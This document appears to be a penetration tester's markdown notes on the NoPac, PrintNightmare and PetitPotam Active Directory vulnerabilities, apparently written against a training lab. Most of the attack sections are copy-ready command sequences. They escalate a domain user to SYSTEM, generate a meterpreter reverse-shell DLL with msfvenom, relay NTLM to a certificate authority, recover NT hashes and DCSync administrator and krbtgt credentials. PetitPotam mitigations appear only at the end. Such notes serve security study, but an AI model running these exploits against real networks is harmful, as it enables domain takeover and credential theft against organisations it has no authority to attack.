### Content
- [NoPac](#nopac)
- [PrintNightmare](#printnightmare)
---
# NoPac
This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.

## CVE-2021-42278 – SAM Name impersonation
`A vulnerability with the Security Account Manager (SAM).`

- Internally, Active Directory (AD) uses several naming schemes for a given object. Like userPrincipalName (UPN), and sAMAccountName (SAM-Account).
- In cases of computers – these sAMAccountName attributes usually end with `$` in their name. Traditionally, this `$` was used to distinguish between user objects and computer objects. It is important to mention there are no restrictions or validations for changing this attribute to include or not include the `$` sign.
- With default settings, when the relevant patch is **not** applied, a normal user has permission to modify a machine account (up to 10 machines) and as its owner, they also have the permissions to edit its sAMAccountName attribute.

## CVE-2021-42287 - KDC bamboozling
`A vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.`

- When performing an authentication using Kerberos, Ticket-Granting-Ticket (TGT) and the following Ticket-Granting-Service (TGS) are being requested from the Key Distribution Center (KDC). In case a TGS was requested for an account that could not be found, the KDC will attempt to search it again with a trailing `$`.
- For example, if there is a domain controller with a SAM account name of DC1$, an attacker may create a new machine account and rename its SAM account name to DC1, request a TGT, rename it again for a different name, and request a TGS ticket, presenting the TGT he has in hands.
- When processing the TGS request, the KDC will fail its lookup for the requestor machine DC1 which the attacker had created. Therefore, The KDC will perform another lookup appending a trailing `$` so the requestor name becomes `DC1$`. The lookup will succeed. As a result, the KDC will issue the ticket using the privileges of DC1$.

[tool](https://github.com/Ridter/noPac) to perform this attack.

```bash
$ git clone https://github.com/Ridter/noPac.git
# See if the system is vulnerable by checking if ms-DS-MachineAccountQuota > 0
$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
# Obtain a shell with SYSTEM level privileges
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
# NoPac.py saves the TGT in the directory on the attack host where the exploit was run.
# We can then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync.


# Using noPac to DCSync the Built-in Administrator Account, it uses secretsdump.py inside it with -dump flag
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

# Using secretsdump
export KRB5CCNAME=/path/to/tgt
$ secretsdump.py -just-dc-user wley -k -no-pass -dc-ip 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' @'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL'
```

---
# PrintNightmare

This vulnerability encompasses two CVEs [2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems and allows remote execution of arbitrary code with SYSTEM rights using a domain account.

`PrintNightmare` is an RCE (Remote Command Execution) vulnerability. 
If the vulnerable machine is configured to reject remote connection, this vulnerability could still be exploited in an LPE (Local Privilege Escalation).

The vulnerability lies in the functions allowing remote driver installation by users, `RpcAddPrinterDriverEx` and `RpcAddPrinterDriver`.

1. The attacker stores the driver DLL file on a SMB share reachable from the server.
2. The client creates a [`DRIVER_INFO_2`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2) object containing the path to the attacker's DLL and passes it into the DRIVER_CONTAINER object.
3. The client calls [`RpcAddPrinterDriverEx`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b) with the `DRIVER_CONTAINER` to load the attacker's DLL into the server's dynamic library and with multiple bit values within the `dwFileCopyFlags` in order to bypass the `SeLoadDriverPrivilege` privilege verification by the server.
4. The attacker's DLL is executed on the server within `SYSTEM` context.

## Print Spooler Service

The Print Spooler is a Microsoft built-in service that manages printing jobs. It is enabled by default and runs within the `SYSTEM` context.
3 RPC protocols are registered by the spooler:
- `MS-RPRN`: Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server synchronously.
- `MS-PAR`: Microsoft’s Print System Asynchronous Remote Protocol. It has the same functionalities as MS-RPRN, but works asynchronously.
- `MS-PAN`: Microsoft’s Print System Asynchronous Notification Protocol. It is used to receive print status notifications from a print server and to send server-requested responses to those notifications back to the server.

Using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit

```bash
# Clone the exploit
$ git clone https://github.com/cube0x0/CVE-2021-1675.git

# Install cube0x0's Version of Impacket
$ pip3 uninstall impacket
$ git clone https://github.com/cube0x0/impacket
$ cd impacket
$ python3 ./setup.py install

# Check if the target is exposed
$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 

# Generate a DLL pyaload
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# Create a Share with smbserver.py
$ sudo smbserver.py -smb2support shareName /path/to/dll

# Start a meterpreter listener
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

# Run the exploit on the attacker machine, a reverse shell will start on the meterpreter listener
$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\shareName\backupscript.dll'
```
---
# PetitPotam

CVE [2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use.

In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

Tool for Linux attack host [PetitPotam.py](https://github.com/topotam/PetitPotam).
PowerShell implementation of the tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1).

```bash
# Starting ntlmrelayx.py in window
$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
# If we didn't know the location of the CA, we could use:
# certi (https://github.com/zer1t0/certi) or
# ceripy-ad (https://github.com/ly4k/Certipy) to attempt to locate it. <<<---

# Run the tool PetitPotam.py <attack host IP> <Domain Controller IP> on another window 
# to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.
$ python3 PetitPotam.py 172.16.5.225 172.16.5.5  

# A base64 Encoded Certificate for DC01 will appear on the ntlmrelayx window

# Requesting a TGT Using gettgtpkinit.py
$ python3 gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64Blob> dc01.ccache
# The command output will be a ccache file and (((((AS-REP encryption key)))))

# Set KRB5CCNAME Environment Variable
$ export KRB5CCNAME=dc01.ccache

# We can also extraxt DC01 NT hash using the tool getnthash.py from PKINITtools while (KRB5CCNAME exported) 
$ PKINITtools/getnthash.py -key <key_from_gettgtpkinit> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

Recovered NT Hash
00dff1753260356245407a1a4bbb7b58


# Using Domain Controller TGT to DCSync the administrator hash
$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL


# Using Domain Controller NT hash to DCSync the administrator hash
$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes :00dff1753260356245407a1a4bbb7b58
```

After obtaining the base64 blob from `ntlmrelayx.py` we can request a `TGT` and perform `PTT` witch `DC01$` machine account
```Powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

# Then performing DCSync with Mimikatz
PS C:\Tools> .\mimikatz.exe 'lsadump::dcsync /user:inlanefreight\krbtgt'
```

## PetitPotam Mitigations

First off, the patch for [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) should be applied to any affected hosts. Below are some further hardening steps that can be taken:

- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use
